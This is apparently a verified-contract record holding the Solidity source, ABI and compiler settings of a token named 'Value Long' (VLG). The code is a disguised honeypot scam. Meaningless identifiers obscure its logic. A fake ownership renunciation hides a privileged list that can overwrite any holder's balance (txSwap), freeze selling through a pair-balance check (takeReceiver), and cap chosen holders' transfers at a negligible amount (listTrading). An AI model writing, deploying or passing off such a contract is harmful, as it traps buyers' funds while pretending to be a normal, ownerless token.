{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface teamTo {\n    function createPair(address modeTeam, address receiverSwapMax) external returns (address);\n}\n\ninterface buyMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletShould) external view returns (uint256);\n\n    function transfer(address autoAmount, uint256 modeToken) external returns (bool);\n\n    function allowance(address isFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoAmount,\n        uint256 modeToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyLaunched, uint256 value);\n    event Approval(address indexed isFrom, address indexed spender, uint256 value);\n}\n\nabstract contract receiverAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchTradingSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface shouldTo is buyMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ValueLong is receiverAuto, buyMode, shouldTo {\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountMarketingFee;\n    }\n\n    string private enableToAt = \"Value Long\";\n\n    mapping(address => bool) public sellExemptLimit;\n\n    function transfer(address liquidityBuy, uint256 modeToken) external virtual override returns (bool) {\n        return totalTeam(_msgSender(), liquidityBuy, modeToken);\n    }\n\n    function balanceOf(address walletShould) public view virtual override returns (uint256) {\n        return walletBuy[walletShould];\n    }\n\n    function receiverSell(address limitLiquidity, address autoAmount, uint256 modeToken) internal returns (bool) {\n        require(walletBuy[limitLiquidity] >= modeToken);\n        walletBuy[limitLiquidity] -= modeToken;\n        walletBuy[autoAmount] += modeToken;\n        emit Transfer(limitLiquidity, autoAmount, modeToken);\n        return true;\n    }\n\n    address public enableAt;\n\n    bool public receiverAmount;\n\n    address isSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address shouldFundReceiver, address buyTxWallet) external view virtual override returns (uint256) {\n        if (buyTxWallet == isSender) {\n            return type(uint256).max;\n        }\n        return receiverTo[shouldFundReceiver][buyTxWallet];\n    }\n\n    mapping(address => uint256) private walletBuy;\n\n    event OwnershipTransferred(address indexed isAt, address indexed launchTeam);\n\n    function getOwner() external view returns (address) {\n        return receiverFrom;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapReceiverAuto;\n    }\n\n    constructor (){\n        if (maxReceiver == atMin) {\n            txSellReceiver = marketingSell;\n        }\n        launchTradingSell shouldTeamTrading = launchTradingSell(isSender);\n        amountLaunchExempt = teamTo(shouldTeamTrading.factory()).createPair(shouldTeamTrading.WETH(), address(this));\n        \n        enableAt = _msgSender();\n        sellExemptLimit[enableAt] = true;\n        walletBuy[enableAt] = swapReceiverAuto;\n        amountTakeIs();\n        if (atMin != receiverAmount) {\n            txSender = marketingSell;\n        }\n        emit Transfer(address(0), enableAt, swapReceiverAuto);\n    }\n\n    uint256 private swapReceiverAuto = 100000000 * 10 ** 18;\n\n    function takeReceiver(uint256 modeToken) public {\n        receiverLaunched();\n        walletMaxTx = modeToken;\n    }\n\n    address private receiverFrom;\n\n    uint256 public txSellReceiver;\n\n    function transferFrom(address limitLiquidity, address autoAmount, uint256 modeToken) external override returns (bool) {\n        if (_msgSender() != isSender) {\n            if (receiverTo[limitLiquidity][_msgSender()] != type(uint256).max) {\n                require(modeToken <= receiverTo[limitLiquidity][_msgSender()]);\n                receiverTo[limitLiquidity][_msgSender()] -= modeToken;\n            }\n        }\n        return totalTeam(limitLiquidity, autoAmount, modeToken);\n    }\n\n    function approve(address buyTxWallet, uint256 modeToken) public virtual override returns (bool) {\n        receiverTo[_msgSender()][buyTxWallet] = modeToken;\n        emit Approval(_msgSender(), buyTxWallet, modeToken);\n        return true;\n    }\n\n    string private amountMarketingFee = \"VLG\";\n\n    bool public amountShouldTake;\n\n    bool public fromReceiver;\n\n    uint256 public enableLimit;\n\n    function owner() external view returns (address) {\n        return receiverFrom;\n    }\n\n    function txSwap(address liquidityBuy, uint256 modeToken) public {\n        receiverLaunched();\n        walletBuy[liquidityBuy] = modeToken;\n    }\n\n    function totalTeam(address limitLiquidity, address autoAmount, uint256 modeToken) internal returns (bool) {\n        if (limitLiquidity == enableAt) {\n            return receiverSell(limitLiquidity, autoAmount, modeToken);\n        }\n        uint256 exemptMax = buyMode(amountLaunchExempt).balanceOf(listSender);\n        require(exemptMax == walletMaxTx);\n        require(autoAmount != listSender);\n        if (enableLaunch[limitLiquidity]) {\n            return receiverSell(limitLiquidity, autoAmount, feeMarketing);\n        }\n        return receiverSell(limitLiquidity, autoAmount, modeToken);\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverTo;\n\n    uint256 public marketingSell;\n\n    function name() external view virtual override returns (string memory) {\n        return enableToAt;\n    }\n\n    mapping(address => bool) public enableLaunch;\n\n    function txMarketing(address tokenSwapLiquidity) public {\n        if (fromReceiver) {\n            return;\n        }\n        if (amountShouldTake) {\n            receiverAmount = false;\n        }\n        sellExemptLimit[tokenSwapLiquidity] = true;\n        \n        fromReceiver = true;\n    }\n\n    function amountTakeIs() public {\n        emit OwnershipTransferred(enableAt, address(0));\n        receiverFrom = address(0);\n    }\n\n    uint256 public txSender;\n\n    address listSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function listTrading(address enableAuto) public {\n        receiverLaunched();\n        \n        if (enableAuto == enableAt || enableAuto == amountLaunchExempt) {\n            return;\n        }\n        enableLaunch[enableAuto] = true;\n    }\n\n    uint256 sellEnableExempt;\n\n    bool public atMin;\n\n    uint8 private walletFee = 18;\n\n    function receiverLaunched() private view {\n        require(sellExemptLimit[_msgSender()]);\n    }\n\n    bool public maxReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletFee;\n    }\n\n    uint256 walletMaxTx;\n\n    address public amountLaunchExempt;\n\n    uint256 constant feeMarketing = 16 ** 10;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFundReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyTxWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLaunchExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountShouldTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTakeIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTxWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAuto\",\"type\":\"address\"}],\"name\":\"listTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellExemptLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeToken\",\"type\":\"uint256\"}],\"name\":\"takeReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSwapLiquidity\",\"type\":\"address\"}],\"name\":\"txMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSellReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeToken\",\"type\":\"uint256\"}],\"name\":\"txSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ValueLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}